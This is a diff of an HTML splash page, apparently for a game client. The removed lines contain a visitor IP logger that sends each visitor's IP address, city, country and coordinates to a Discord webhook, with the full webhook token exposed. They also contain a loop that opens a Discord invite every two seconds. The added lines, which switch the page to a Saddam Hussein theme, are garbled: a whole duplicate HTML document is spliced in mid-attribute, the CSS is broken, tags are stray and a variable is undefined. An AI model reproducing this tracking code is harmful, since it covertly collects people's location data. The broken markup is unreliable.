@@ -4,14 +4,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg/RLS</title>
+    <title>صدام حسين الجمهورية</title>
     <style>
        body {
             margin: 0;
             padding: 0;
             background: black;
             font-family: 'Courier New', Courier, monospace;
-            color: #9f8663;
+            color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -67,7 +67,7 @@
 <body>
     <div class="video-container">
         <video autoplay loop muted>
-            <source src="https://cdn.discordapp.com/attachments/1337536914432983213/1354951078323425290/ssstwitter.com_1742362804371.mp4?ex=67e72806&is=67e5d686&hm=00dccc2d31dccbaa8704216bc43518f5d8db9e018fe40569b8e471b5a4013cc4&" type="video/mp4">
+            <source src="https://www.youtube.com/watch?v=07Ts7kNRBWU" type="video/mp4">
             Your browser does not support the video tag.
         </video>
     </div>
@@ -78,16 +78,101 @@
 
     <div id="content">
         <div class="image-container">
-            <img src="https://b.top4top.io/p_3373dsc531.gif" alt="">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/56/Saddam_Hussein_1979.jpg" alt="">
         </div>
 
 
         <audio autoplay loop>
-            <source src="https://b.top4top.io/m_3373o010c1.mp3" type="audio/mpeg">
+            <source src="https://www.yo
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صدام حسين الجمهورية</title>
+    <style>
+       body {
+            margin: 0;
+            padding: 0;
+            background: black;
+            font-family: 'Courier New', Courier, monospace;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            overflow: hidden;
+        }
+        #content {
+            display: none;
+            opacity: 0;
+            transition: opacity 2s ease;
+        }
+        .image-container img {
+            width: 400px; 
+            height: auto;
+            border: 2px solid #c2c2c2; 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, , 0, 0.7); 
+        }
+          .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #ffffff; 
+            text-shadow: 0 0 8px #000000 0 0 15px #000000, 0 0 25px #000000;
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 5px;
+            font-size: 75px; 
+            color: #ffffff; 
+            text-shadow: 0 0 8px #000000, 0 0 15px #000000, 0 0 25px #000000; 
+            letter-spacing: 4.5px;
+        }
+        .video-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: -1; /* Make sure it's behind other content */
+        }
+        .video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(15px); /* Apply blur effect */
+        }
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <video autoplay loop muted>
+            <source src="https://www.youtube.com/watch?v=07Ts7kNRBWU" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+
+    <div class="gif-container">
+        <img src="" alt="">
+    </div>
+
+    <div id="content">
+        <div class="image-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/56/Saddam_Hussein_1979.jpg" alt="">
+        </div>
+
+
+        <audio autoplay loop>
+            <source src="https://www.youtube.com/watch?v=07Ts7kNRBWU" type="audio/mpeg">
             Your browser does not support the audio element.
         </audio>
         <div class="info" id="ip-info"></div>
-        <div class="text">discord.gg/k1t</div>
+        <div class="text">صدااااااااممممممممم</div>
     </div>
 
     <script>
@@ -103,24 +188,39 @@
         fetch('https://ipinfo.io/json')
         .then(response => response.json())
         .then(data => {
-            const { ip, country, city, region, loc, org, timezone } = data;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.innerHTML = `k1 team by NESM 
-<strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
-
-            const dateTime = new Date().toLocaleString();
-            const webhookUrl = 'https://discord.com/api/webhooks/1342711596035604511/c2zeLZnSp0faGn2G7rnFX6NOdOt1ewLys7Sp55NJt1p1A6FIkFkDciidXSyaV7_3WGie';
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
-            });
+            infoDiv.innerHTML = `by AST5ARA `
         });
 
-        setInterval(function() {
-            window.invokeNative("openUrl", "https://discord.gg/k1t");
-            window.invokeNative("openUrl", "https://discord.gg/k1t");
-             },     2000);
+    </script>
+</body>
+</html>
+</script>
+</body>
+</html>
+</script>
+<marquee>utube.com/watch?v=07Ts7kNRBWU" type="audio/mpeg">
+            Your browser does not support the audio element.
+        </audio>
+        <div class="info" id="ip-info"></div>
+        <div class="text">صدااااااااممممممممم</div>
+    </div>
+
+    <script>
+        setTimeout(() => {
+            document.querySelector('.gif-container').style.display = 'none';
+            const content = document.getElementById('content');
+            content.style.display = 'block';
+            setTimeout(() => {
+                content.style.opacity = 1;
+            }, 0200); 
+        }, 0200);
+
+        fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            infoDiv.innerHTML = `by AST5ARA `
+        });
+
     </script>
 </body>
 </html>
